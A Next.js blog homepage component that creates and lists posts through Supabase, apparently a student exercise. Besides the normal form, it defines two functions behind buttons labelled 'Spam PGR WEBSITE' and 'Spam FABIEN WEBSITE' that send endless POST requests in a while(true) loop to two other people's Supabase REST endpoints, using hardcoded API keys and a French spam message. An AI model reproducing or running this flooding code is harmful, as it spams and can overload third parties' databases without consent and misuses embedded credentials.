import { FormEvent, useState } from "react";
import { postRepository } from "../core/postRepository";
import { PostDto } from "../core/PostDto";
import { GetServerSideProps } from "next";

interface HomeProps {
  posts: PostDto[];
}

export const getServerSideProps: GetServerSideProps<HomeProps> = async (
  context
) => {
  const { data } = await postRepository.getAllPost();
  return {
    props: {
      posts: data ?? [],
    },
  };
};

export default function Home(props: HomeProps) {
  const [title, setTitle] = useState("");
  const [summary, setSummary] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [posts, setPosts] = useState<PostDto[]>(props.posts);
  const createPost = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    const { data, error } = await postRepository.createPost({
      title,
      summary,
    });

    setErrorMessage(error ? error.message : "");
    if (data) {
      setPosts((prev) => [...prev, ...data]);
    }
    setTitle("");
    setSummary("");
  };

  const dataPGR = {
    title: "Je viens te spam depuis le site de Mathieu",
    summary: "Ouai pas de chance :( j'ai cliqué sur le bouton interdit",
  };

  async function postRequestPGR() {
    while (true) {
      fetch(
        "https://wcejseoasfslqunfxmdr.supabase.co/rest/v1/post?columns=%22title%22%2C%22summary%22",
        {
          method: "POST",
          body: JSON.stringify(dataPGR),
          headers: {
            apikey:
              "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndjZWpzZW9hc2ZzbHF1bmZ4bWRyIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NDk3MDU1MDYsImV4cCI6MTk2NTI4MTUwNn0.Ps2WlomIfIo9BlQ1OGaQIoRfA5Ts-WS2vC2lcQGHA-s",
            authorization:
              "bearer" +
              "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndjZWpzZW9hc2ZzbHF1bmZ4bWRyIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NDk3MDU1MDYsImV4cCI6MTk2NTI4MTUwNn0.Ps2WlomIfIo9BlQ1OGaQIoRfA5Ts-WS2vC2lcQGHA-s",
            Accept: "application/json",
            "Content-Type": "application/json",
          },
        }
      );
    }
  }

  async function postRequestFABIEN() {
    while (true) {
      fetch(
        "https://jrbwgmxmyruzbovtjdhl.supabase.co/rest/v1/post?columns=%22title%22%2C%22summary%22",
        {
          method: "POST",
          body: JSON.stringify(dataPGR),
          headers: {
            apikey:
              "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpyYndnbXhteXJ1emJvdnRqZGhsIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NDk3MDU0NzksImV4cCI6MTk2NTI4MTQ3OX0.BjMoYOdZ9VPHy-YRNrJPyKMwlivKc-OycycevZO99NU",
            authorization:
              "bearer" +
              "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpyYndnbXhteXJ1emJvdnRqZGhsIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NDk3MDU0NzksImV4cCI6MTk2NTI4MTQ3OX0.BjMoYOdZ9VPHy-YRNrJPyKMwlivKc-OycycevZO99NU",
            Accept: "application/json",
            "Content-Type": "application/json",
          },
        }
      );
    }
  }

  return (
    <div>
      <h1>NEXTJS BLOG</h1>
      {errorMessage && <p>{errorMessage}</p>}
      <form
        onSubmit={createPost}
        style={{
          display: "flex",
          flexDirection: "column",
          gap: "24px",
          maxWidth: "408px",
        }}
      >
        <input
          placeholder="Title"
          value={title}
          onChange={(e) => setTitle(e.target.value)}
        />
        <textarea
          placeholder="Summary"
          value={summary}
          onChange={(e) => setSummary(e.target.value)}
        />
        <button type="submit">Save</button>
        <button type="button" onClick={postRequestPGR}>
          Spam PGR WEBSITE
        </button>
        <button type="button" onClick={postRequestFABIEN}>
          Spam FABIEN WEBSITE
        </button>
      </form>
      <hr />
      <ul>
        {posts.map((post) => (
          <li key={post.id}>
            <h3>{post.title}</h3>
            <p>{post.summary}</p>
          </li>
        ))}
      </ul>
    </div>
  );
}
